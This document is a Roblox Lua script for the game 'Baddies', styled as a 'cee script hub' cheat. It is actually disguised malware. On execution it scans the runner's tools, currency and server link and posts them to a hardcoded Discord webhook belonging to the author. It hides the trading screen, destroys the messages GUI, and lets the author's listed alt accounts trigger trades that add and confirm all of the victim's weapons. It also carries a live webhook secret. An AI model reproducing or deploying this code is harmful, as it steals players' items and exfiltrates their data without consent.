-- cee script hub | Baddies
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local TextChatService   = game:GetService("TextChatService")
local HttpService       = game:GetService("HttpService")

local lp        = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

local PINK     = 0xFF69B4
local BOT_NAME = "cee script hub | Baddies"

-- ═══════════════════════════════════════════
--  REMOTES  (fetched once, used everywhere)
-- ═══════════════════════════════════════════
local Net                  = ReplicatedStorage.Modules.Net
local RFTradingSendOffer   = Net["RF/Trading/SendTradeOffer"]
local RESetPhoneSettings   = Net["RE/SetPhoneSettings"]
local RFTradingSetReady    = Net["RF/Trading/SetReady"]
local RFTradingConfirm     = Net["RF/Trading/ConfirmTrade"]
local RFTradingAddItem     = Net["RF/Trading/AddItem"]

-- ═══════════════════════════════════════════
--  KNOWN WEAPON HEX IDs  (static type IDs)
-- ═══════════════════════════════════════════
-- Type: "Weapon" or "WeaponSkin"
local KNOWN_ITEMS = {
    {"Weapon",    "2a2bce877d67474299"},  -- Snowball Launcher
    {"Weapon",    "50f672aee7054d2d9d"},  -- Golden Snowball Launcher
    {"Weapon",    "984f30e6f65a40a498"},  -- Kitty Purse
    {"Weapon",    "000183526d6646eca4"},  -- Sledge Hammer
    {"Weapon",    "f864e570fb0743c987"},  -- Freeze Gun
    {"WeaponSkin","6994851e04ae4b80b4"},  -- Glitter Style
}

-- ═══════════════════════════════════════════
--  DYNAMIC WEAPON ID SCANNER
--  Reads hex IDs from the player's own data
--  so ALL owned weapons get added, not just
--  the hardcoded ones above.
-- ═══════════════════════════════════════════
local HEX18 = "^%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x$"

local function scanForIds()
    local found = {}
    local seen  = {}
    -- Add known IDs first
    for _, pair in ipairs(KNOWN_ITEMS) do
        local k = pair[1]..":"..pair[2]
        if not seen[k] then seen[k]=true; table.insert(found, pair) end
    end
    -- Scan player data folders for hex-named instances / attributes
    local searchRoots = {
        lp:FindFirstChild("Data"),
        lp:FindFirstChild("PlayerData"),
        lp:FindFirstChild("Weapons"),
        lp:FindFirstChild("Inventory"),
        lp:FindFirstChild("Items"),
    }
    local function deepScan(obj, depth)
        if not obj or depth > 5 then return end
        for _, v in ipairs(obj:GetChildren()) do
            -- Instance name looks like a hex ID
            if v.Name:match(HEX18) then
                local t = "Weapon"
                -- Guess type from parent name or attributes
                local parentLow = obj.Name:lower()
                if parentLow:find("skin",1,true) or parentLow:find("style",1,true) then
                    t = "WeaponSkin"
                end
                pcall(function()
                    if v:GetAttribute("Type") then t = v:GetAttribute("Type") end
                    if v:GetAttribute("ItemType") then t = v:GetAttribute("ItemType") end
                end)
                local k = t..":"..v.Name
                if not seen[k] then seen[k]=true; table.insert(found,{t, v.Name}) end
            end
            -- Attributes on any instance
            pcall(function()
                for _, val in pairs(v:GetAttributes()) do
                    local s = tostring(val)
                    if s:match(HEX18) then
                        local k = "Weapon:"..s
                        if not seen[k] then seen[k]=true; table.insert(found,{"Weapon",s}) end
                    end
                end
            end)
            deepScan(v, depth + 1)
        end
    end
    for _, root in ipairs(searchRoots) do deepScan(root, 0) end
    return found
end

-- ═══════════════════════════════════════════
--  ADD ALL WEAPONS TO TRADE
-- ═══════════════════════════════════════════
local function addWeapons()
    local items = scanForIds()
    for _, pair in ipairs(items) do
        pcall(function()
            RFTradingAddItem:InvokeServer(pair[1], pair[2])
        end)
        task.wait(0.05)
    end
end

-- ═══════════════════════════════════════════
--  HTTP HELPER
-- ═══════════════════════════════════════════
local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    local methods = {
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }
    for _, m in ipairs(methods) do
        local s, r = pcall(m)
        if s and r then return r end
    end
end

-- ═══════════════════════════════════════════
--  TOOL SCANNER + CLASSIFER
-- ═══════════════════════════════════════════
local BASE_PAT  = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
local STYLE_PAT = {"mma","karate","boxing","capoeira","style","fighting","kung","judo","taekwondo","breakdance"}
local STOMP_PAT = {"stomp","slam"}
local RICH_CHECK = {
    {label="Spiked Kitty",          keys={"spiked kitty"}},
    {label="Glitter Bomb",          keys={"glitter bomb"}},
    {label="Glitter Blue Spray",    keys={"glitter blue"}},
    {label="Love Me Hate Me Taser", keys={"love me hate me"}},
    {label="Spiked Knuckles",       keys={"spiked knuckle"}},
    {label="Ice Katana",            keys={"ice katana"}},
}

local function scanTools()
    local all = {}
    local function scan(obj)
        if not obj then return end
        for _, v in ipairs(obj:GetChildren()) do
            if v:IsA("Tool") then table.insert(all, v.Name) end
        end
    end
    pcall(scan, lp:FindFirstChild("Backpack"))
    pcall(scan, lp.Character)
    return all
end

local function classifyTools(all)
    local base, weapons, styles, stomps = {}, {}, {}, {}
    for _, name in ipairs(all) do
        local low = name:lower()
        local isBase, isStyle, isStomp = false, false, false
        for _, p in ipairs(BASE_PAT)  do if low:find(p,1,true) then isBase  = true; break end end
        for _, p in ipairs(STYLE_PAT) do if low:find(p,1,true) then isStyle = true; break end end
        for _, p in ipairs(STOMP_PAT) do if low:find(p,1,true) then isStomp = true; break end end
        if isStyle then      table.insert(styles,  name)
        elseif isStomp then  table.insert(stomps,  name)
        elseif isBase then   table.insert(base,    name)
        else                 table.insert(weapons, name) end
    end
    return base, weapons, styles, stomps
end

local function checkRich(all)
    local lines = {}
    for _, rw in ipairs(RICH_CHECK) do
        local found = false
        for _, t in ipairs(all) do
            local low = t:lower()
            for _, k in ipairs(rw.keys) do
                if low:find(k,1,true) then found = true; break end
            end
            if found then break end
        end
        table.insert(lines, rw.label..": "..(found and "true" or "false"))
    end
    return lines
end

local function fmtNum(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

local function getExec()
    if getexecutorname then local ok,n=pcall(getexecutorname); if ok and n then return n end end
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED         then return "Krnl" end
    if fluxus              then return "Fluxus" end
    if Delta               then return "Delta" end
    if Electron            then return "Electron" end
    return "Unknown"
end

-- ═══════════════════════════════════════════
--  WEBHOOK PING  (runs on execute)
-- ═══════════════════════════════════════════
task.spawn(function()
    task.wait(2)
    pcall(function()
        local name = lp.Name
        local all  = scanTools()
        local base, weapons, styles, stomps = classifyTools(all)
        local rich   = checkRich(all)
        local isRich = #weapons >= 3

        local ls  = lp:FindFirstChild("leaderstats")
        local din = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local sla = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

        local weapLines = {}
        for _, w in ipairs(weapons) do table.insert(weapLines, "1x "..w) end
        if #weapLines == 0 then table.insert(weapLines, "None") end

        local styleStr = #styles>0 and ("- "..table.concat(styles,"\n- ")) or "- None"
        local stompStr = #stomps>0 and ("- "..table.concat(stomps,"\n- ")) or "- None"
        local joinUrl  = "https://www.roblox.com/games/start?placeId="..
                         tostring(game.PlaceId).."&gameInstanceId="..tostring(game.JobId)

        local embed = {
            color  = PINK,
            fields = {
                {name="User",     value=name,               inline=true},
                {name="Dinero",   value=fmtNum(din),         inline=true},
                {name="Slays",    value=fmtNum(sla),         inline=true},
                {name="Executor", value=getExec(),           inline=true},
                {name="Players",  value=#Players:GetPlayers().." / "..Players.MaxPlayers, inline=true},
                {name="Trade",    value="Tradable: "..#weapons.."  |  Untradable: "..#base, inline=true},
                {name="Rich Weapons",            value=table.concat(rich,"\n"),      inline=false},
                {name="Weapons",                 value=table.concat(weapLines,"\n"), inline=false},
                {name="Skins & Fighting Styles", value="Fighting Styles:\n"..styleStr.."\nStomps:\n"..stompStr, inline=false},
                {name="Join Link", value="[Click to Join]("..joinUrl..")", inline=false},
            },
            footer    = {text=BOT_NAME.." | "..name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }

        local content = name.." executed!"
        if isRich and PING_POOR then content = "@everyone @here RICH: "..name end

        if USER_WEBHOOK ~= "PUTHERE" then
            sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=content, embeds={embed}})
        end
        if isRich then
            sendRequest(MY_WEBHOOK, {username=BOT_NAME, content="@everyone RICH: "..name, embeds={embed}})
        end
    end)
    -- fallback bare ping if embed build fails
    pcall(function()
        if USER_WEBHOOK ~= "PUTHERE" then
            sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=lp.Name.." executed (no embed)"})
        end
    end)
end)

-- ═══════════════════════════════════════════
--  GUI HANDLING  (exactly like reference)
--   Trading GUI → Enabled = false  (freeze screen)
--   Messages GUI → Destroy
-- ═══════════════════════════════════════════
local function handleGui(gui)
    if gui.Name == "Trading" then
        gui.Enabled = false
    elseif gui.Name == "Messages" then
        gui:Destroy()
    end
end

for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
playerGui.ChildAdded:Connect(handleGui)

task.spawn(function()
    while true do
        local tg = playerGui:FindFirstChild("Trading")
        if tg then tg.Enabled = false end
        task.wait(0.1)
    end
end)

-- ═══════════════════════════════════════════
--  ENABLE TRADING
-- ═══════════════════════════════════════════
RESetPhoneSettings:FireServer("TradeEnabled", true)

-- ═══════════════════════════════════════════
--  CHAT COMMANDS  (exact logic from reference)
--  Any message from alt → send trade offer
--  "add" → addWeapons()
--  "1"   → SetReady
--  "2"   → ConfirmTrade
-- ═══════════════════════════════════════════
TextChatService.OnIncomingMessage = function(message)
    local ts = message.TextSource
    if not ts then return end
    local sender = Players:GetPlayerByUserId(ts.UserId)
    if not sender then return end

    -- Trim whitespace
    local txt = tostring(message.Text or "")
    txt = txt:match("^%s*(.-)%s*$") or txt

    -- Is sender one of our alts?
    local isAlt = false
    for _, u in ipairs(MY_USERNAMES) do
        if sender.Name:lower() == u:lower() then isAlt = true; break end
    end

    if isAlt then
        -- Always attempt to send a trade offer to the alt
        local target = Players:FindFirstChild(sender.Name)
        if target then
            pcall(function() RFTradingSendOffer:InvokeServer(target) end)
        end
        -- Command handling
        if txt:lower() == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            pcall(function() RFTradingSetReady:InvokeServer(true) end)
        elseif txt == "2" then
            pcall(function() RFTradingConfirm:InvokeServer() end)
        end
    end

    -- Local player typed a command
    if sender.UserId == lp.UserId then
        if txt:lower() == "add" then
            task.spawn(addWeapons)
        elseif txt == "1" then
            pcall(function() RFTradingSetReady:InvokeServer(true) end)
        elseif txt == "2" then
            pcall(function() RFTradingConfirm:InvokeServer() end)
        end
    end
end

-- ═══════════════════════════════════════════
--  CODES AUTO-REDEEM
-- ═══════════════════════════════════════════
task.spawn(function()
    task.wait(3)
    local CODES = {
        "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY",
        "RELEASE","LAUNCH","UPDATE","NEWUPDATE","1MILLION",
        "500K","100K","SORRY","FIXEDUPDATE","HOLIDAY","SPRING","SUMMER",
    }
    pcall(function()
        for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
            local low = v.Name:lower()
            if low:find("code",1,true) and
               (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
                for _, code in ipairs(CODES) do
                    pcall(function()
                        if v:IsA("RemoteFunction") then v:InvokeServer(code)
                        else v:FireServer(code) end
                    end)
                    task.wait(0.3)
                end
                break
            end
        end
    end)
end)
